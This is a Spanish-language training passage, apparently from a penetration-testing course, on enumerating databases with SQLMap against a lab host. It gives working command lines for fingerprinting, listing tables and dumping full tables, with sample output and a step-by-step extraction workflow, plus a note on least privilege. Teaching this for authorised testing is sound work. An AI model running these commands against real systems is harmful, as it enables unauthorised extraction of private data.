# Enumeración de bases de datos con SQLMap

## Cómo SQLMap construye sus consultas de enumeración

SQLMap mantiene un archivo de definiciones (`data/xml/queries.xml`) con la consulta SQL exacta a usar para cada operación de enumeración, específica de cada motor de base de datos soportado. Un fragmento ilustrativo para MySQL:

```xml
<banner query="VERSION()"/>
<current_user query="CURRENT_USER()"/>
<current_db query="DATABASE()"/>
<is_dba query="(SELECT super_priv FROM mysql.user WHERE user='%s' LIMIT 0,1)='Y'"/>
```

Cuando se pide el "banner" (`--banner`), SQLMap usa internamente `VERSION()` — exactamente la misma consulta que se usó manualmente en el bloque anterior para hacer fingerprinting del motor. Lo que SQLMap añade es la **automatización completa**: construir el payload de inyección correcto, enviarlo, interpretar la respuesta, y repetir el proceso para cada pieza de información solicitada.

> Es interesante notar que, para cada operación, suele haber dos variantes de consulta: una para situaciones **in-band** (donde el resultado se ve directamente, como en UNION-based) y otra para situaciones **ciegas** (donde el dato se infiere carácter a carácter mediante lógica booleana).

## Información básica: banner, usuario, base de datos, privilegios

```bash
sqlmap -u "http://objetivo.htb/?id=1" --banner --current-user --current-db --is-dba
```

```
banner: '5.1.41-3~bpo50+1'
current user: 'root@%'
current database: 'testdb'
current user is DBA: True
```

> **Aclaración importante**: que el usuario de base de datos se llame `root` (o tenga privilegios de DBA) **no implica** automáticamente privilegios de `root` a nivel de sistema operativo — son contextos de privilegio completamente independientes. Sí es una señal de alarma desde la perspectiva de diseño: una aplicación que se conecta a su base de datos con un usuario con privilegios administrativos completos viola el principio de mínimo privilegio visto en el apartado de mitigación del bloque anterior, ampliando innecesariamente el impacto potencial de cualquier inyección SQL exitosa.

## Enumerando tablas

```bash
sqlmap -u "http://objetivo.htb/?id=1" --tables -D testdb
```

```
Database: testdb
[4 tables]
+---------------+
| member        |
| data          |
| international |
| users         |
+---------------+
```

`-D` especifica la base de datos de interés — el mismo concepto trabajado manualmente vía `INFORMATION_SCHEMA.TABLES` en el bloque anterior, ahora resuelto automáticamente.

## Volcando una tabla completa

```bash
sqlmap -u "http://objetivo.htb/?id=1" --dump -T users -D testdb
```

`--dump` extrae **todas las columnas y filas** de la tabla especificada, presentándolas en una tabla legible directamente en consola y guardándolas además en un archivo CSV para su análisis posterior.

## El paralelismo completo con el trabajo manual

| Enumeración manual (bloque anterior) | Equivalente automatizado en SQLMap |
|---|---|
| `SELECT @@version` | `--banner` |
| `SELECT user()` | `--current-user` |
| `SELECT database()` | `--current-db` |
| `INFORMATION_SCHEMA.SCHEMATA` | `--dbs` |
| `INFORMATION_SCHEMA.TABLES WHERE table_schema=...` | `--tables -D <bd>` |
| `INFORMATION_SCHEMA.COLUMNS WHERE table_name=...` | `--columns -T <tabla> -D <bd>` |
| `SELECT col1, col2 FROM tabla` | `--dump -T <tabla> -D <bd>` |

## Por qué dominar primero la técnica manual hace mejor a quien usa SQLMap

Entender exactamente qué consulta SQL ejecuta SQLMap por debajo de cada flag (`--tables`, `--dump`, etc.) es lo que permite, ante un comportamiento inesperado, **reconstruir manualmente** el equivalente y diagnosticar dónde está fallando — exactamente la razón por la que este bloque se construye explícitamente sobre los fundamentos trabajados a mano en *SQL Injection Fundamentals*.

## Flujo de enumeración recomendado

```
1. --banner --current-user --current-db --is-dba   → contexto general
2. --dbs                                            → ¿qué bases de datos hay?
3. --tables -D <bd_de_interés>                      → ¿qué tablas tiene?
4. --columns -T <tabla> -D <bd>                     → ¿qué columnas tiene?
5. --dump -T <tabla> -D <bd>                        → extracción final
```

Este flujo —idéntico en estructura al trabajado manualmente en el bloque anterior— es la base sobre la que se construyen las técnicas más avanzadas que cierran este bloque: sortear protecciones y, finalmente, interactuar con el sistema operativo subyacente.
